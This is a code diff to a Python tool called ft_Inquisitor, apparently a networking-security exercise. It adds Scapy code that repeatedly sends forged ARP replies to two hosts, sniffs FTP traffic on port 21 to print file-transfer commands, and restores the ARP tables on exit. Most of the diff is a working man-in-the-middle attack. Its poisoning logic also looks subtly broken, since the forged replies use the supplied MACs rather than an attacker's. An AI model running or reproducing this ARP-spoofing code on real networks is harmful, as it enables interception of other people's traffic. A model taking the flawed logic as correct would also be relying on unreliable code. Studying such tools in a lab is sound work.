@@ -45,16 +45,36 @@ def validate_args(args):
         print("Error: IP or MAC are not valid!")
         sys.exit(1)
 
+def sniff_ftp_packets(packet):
+    if packet.haslayer('Raw') and (b'RETR ' in packet['Raw'].load or b'STOR ' in packet['Raw'].load):
+        print(f"FTP File Transfer Detected: {packet['Raw'].load.decode()}")
+
+def arp_poison(ip_src, mac_src, ip_target, mac_target):
+    packet = Ether(dst=mac_target) / ARP(op=2, psrc=ip_src, hwsrc=mac_src, pdst=ip_target, hwdst=mac_target)
+    sendp(packet, iface="eth0", verbose=False)
+
+def restore_arp(ip_src, mac_src, ip_target, mac_target):
+    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc=ip_target, hwsrc=mac_target, pdst=ip_src, hwdst="ff:ff:ff:ff:ff:ff")
+    sendp(packet, count=5, iface="eth0", verbose=False)
+
 def main():
     args = parse_args()
     if len(sys.argv) != 5:
         print("Usage: ./ft_Inquisitor <IP-src> <MAC-src> <IP-target> <MAC-target>")
         return
     validate_args(args)
-    print(f"Source IP: {args.IP_src}")
-    print(f"Source MAC: {args.MAC_src}")
-    print(f"Target IP: {args.IP_target}")
-    print(f"Target MAC: {args.MAC_target}")
+
+    try:
+        print("Starting ARP poisoning...")
+        while True:
+            arp_poison(args.IP_src, args.MAC_src, args.IP_target, args.MAC_target)
+            arp_poison(args.IP_target, args.MAC_target, args.IP_src, args.MAC_src)
+            sniff(prn=sniff_ftp_packets, filter="tcp port 21", iface="eth0", timeout=1)
+    except KeyboardInterrupt:
+        print("Stopping ARP poisoning and restoring ARP tables...")
+        restore_arp(args.IP_src, args.MAC_src, args.IP_target, args.MAC_target)
+        restore_arp(args.IP_target, args.MAC_target, args.IP_src, args.MAC_src)
+        print("ARP tables restored. Exiting.")
 
 if __name__ == "__main__":
     main()
